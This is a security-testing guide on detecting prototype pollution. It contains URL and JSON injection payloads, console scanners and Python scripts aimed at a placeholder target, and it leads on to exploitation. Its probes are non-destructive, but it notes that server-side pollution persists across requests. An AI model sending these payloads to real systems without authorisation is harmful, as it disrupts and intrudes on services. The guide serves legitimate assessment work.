# Prototype Pollution — Detection

## When this applies

You suspect the application unsafely merges user-controlled keys (URL params, JSON bodies, deep `Object.assign` / `_.merge` patterns) into objects. Before exploitation, confirm whether `Object.prototype` can be poisoned and whether pollution survives between requests.

## Technique

### Client-Side Detection

```javascript
// Query String
?__proto__[test]=vulnerable
?__proto__.test=vulnerable
?constructor[prototype][test]=vulnerable

// Hash/Fragment
#__proto__[test]=vulnerable
#constructor[prototype][test]=vulnerable

// Check in Console
Object.prototype
Object.prototype.test  // Should return "vulnerable" if exploitable

// Programmatic Detection
(function() {
    const url = new URL(window.location.href);
    url.searchParams.set('__proto__[pptest]', '1');
    return Object.prototype.pptest === '1' ? 'VULNERABLE' : 'SAFE';
})();
```

### Server-Side Detection

```json
// Property Reflection
{
    "data": "test",
    "__proto__": {
        "polluted": "value"
    }
}
// Check response for "polluted": "value" without explicit declaration

// JSON Spaces (Non-Destructive)
{
    "data": "test",
    "__proto__": {
        "json spaces": 10
    }
}
// Check for increased indentation in raw response

// Status Code Override
{
    "data": "test",
    "__proto__": {
        "status": 555
    }
}
// Check for HTTP 555 status code

// Charset Override (body-parser)
{
    "data": "test",
    "__proto__": {
        "content-type": "application/json; charset=utf-7"
    }
}
// Check if UTF-7 encoding is applied
```

## Steps

1. Identify candidate inputs:
   - URL query string and hash fragment for client-side
   - Any JSON POST/PUT body for server-side
   - `Cookie:` value if parsed as JSON
2. Inject benign pollution payload (`json spaces: 10`, `status: 555`, or unique property name).
3. Re-request a *different* endpoint and inspect the response for pollution side-effects (indentation, status code, reflected property).
4. If detected, narrow down the vulnerable parameter / endpoint by bisecting payload position.
5. Move on to gadget discovery (`gadget-discovery.md`) and exploitation.

### Comprehensive Browser Console Scanner

```javascript
// Quick detection
(function() {
    const testProp = 'pptest_' + Date.now();

    // Test query string
    const url = new URL(window.location.href);
    url.searchParams.set(`__proto__[${testProp}]`, 'vulnerable');

    // Update URL without reload
    window.history.pushState({}, '', url);

    // Check prototype
    setTimeout(() => {
        if (Object.prototype[testProp] === 'vulnerable') {
            console.warn('[VULNERABLE] Prototype pollution detected!');
            console.log('Polluted property:', testProp);
            delete Object.prototype[testProp];
        } else {
            console.log('[SAFE] No prototype pollution detected');
        }
    }, 100);
})();

// Comprehensive scanner
(function() {
    console.log('[PP Scanner] Starting comprehensive scan...');

    const tests = [
        {
            name: 'Query String',
            pollute: () => {
                const url = new URL(window.location.href);
                url.searchParams.set('__proto__[pptest1]', '1');
                window.history.pushState({}, '', url);
            },
            check: () => Object.prototype.pptest1 === '1'
        },
        {
            name: 'Hash Fragment',
            pollute: () => {
                window.location.hash = '#__proto__[pptest2]=1';
            },
            check: () => Object.prototype.pptest2 === '1'
        },
        {
            name: 'Constructor',
            pollute: () => {
                const url = new URL(window.location.href);
                url.searchParams.set('constructor[prototype][pptest3]', '1');
                window.history.pushState({}, '', url);
            },
            check: () => Object.prototype.pptest3 === '1'
        }
    ];

    setTimeout(() => {
        tests.forEach(test => {
            try {
                test.pollute();
                setTimeout(() => {
                    if (test.check()) {
                        console.warn(`[VULNERABLE] ${test.name}`);
                    } else {
                        console.log(`[SAFE] ${test.name}`);
                    }
                }, 50);
            } catch (e) {
                console.error(`[ERROR] ${test.name}:`, e);
            }
        });

        // Cleanup
        setTimeout(() => {
            delete Object.prototype.pptest1;
            delete Object.prototype.pptest2;
            delete Object.prototype.pptest3;
        }, 500);
    }, 100);
})();
```

### Python Detection Scripts

```python
import requests
import json

# Basic detection
def test_prototype_pollution(url, endpoint):
    payload = {
        "data": "test",
        "__proto__": {
            "json spaces": 10
        }
    }

    response = requests.post(f"{url}{endpoint}", json=payload)

    # Check for increased indentation
    if response.text.count('\n') > 5 and '          ' in response.text:
        print("[!] VULNERABLE - JSON spaces pollution detected!")
        return True
    else:
        print("[*] Not vulnerable")
        return False

# Property reflection test
def test_property_reflection(url, endpoint):
    test_prop = "pptest_12345"
    payload = {
        "data": "test",
        "__proto__": {
            test_prop: "vulnerable"
        }
    }

    response = requests.post(f"{url}{endpoint}", json=payload)

    try:
        data = response.json()
        if test_prop in data and data[test_prop] == "vulnerable":
            print(f"[!] VULNERABLE - Property {test_prop} reflected!")
            return True
    except:
        pass

    print("[*] Not vulnerable")
    return False

# Status code test
def test_status_code(url, endpoint):
    payload = {
        "data": "test",
        "__proto__": {
            "status": 555
        }
    }

    response = requests.post(f"{url}{endpoint}", json=payload)

    if response.status_code == 555:
        print("[!] VULNERABLE - Status code pollution detected!")
        return True
    else:
        print("[*] Not vulnerable")
        return False

# Usage
url = "https://target.com"
endpoint = "/api/update"

test_prototype_pollution(url, endpoint)
test_property_reflection(url, endpoint)
test_status_code(url, endpoint)
```

## Verifying success

- **Client-side**: `Object.prototype.<key>` returns the polluted value in DevTools console after sending the payload URL.
- **Server-side (JSON spaces)**: response body has visibly larger indentation (look at raw bytes — pretty-printed responses are normal, but `json spaces: 10` produces 10-space indents).
- **Server-side (status)**: response status code is `555` (or whatever non-standard code you injected).
- **Server-side (reflected property)**: a property you didn't include in the parent object appears in the response as if it had been declared.

## Common pitfalls

1. **`Object.prototype.<key>` already exists** — pick a unique random property name to avoid false positives.
2. **State persists between requests** — pollution in one Node.js process affects all subsequent requests; this is the bug, but also means your tests can interfere. Restart the process before retesting cleanly.
3. **JSON spaces detection requires raw response** — `json.parse()` strips whitespace. Inspect raw bytes (Burp Repeater "Raw" tab).
4. **Status `555` may be intercepted by reverse proxy** — Cloudflare / nginx may rewrite unusual status codes. Use `503` or `599` if `555` returns `502` upstream.
5. **`constructor[prototype]` vs `__proto__`** — different parsers handle them differently. Always test both.

## Tools

- **DOM Invader (Burp built-in)** — automatic source detection and pollution probing
- **Server-Side PP Scanner (Burp BApp Store)** — server-side detection
- **`ppmap`** — `npm install -g ppmap`
- **Burp Repeater** — manual JSON payload crafting
- **Browser DevTools Console** — manual `Object.prototype.<key>` checks
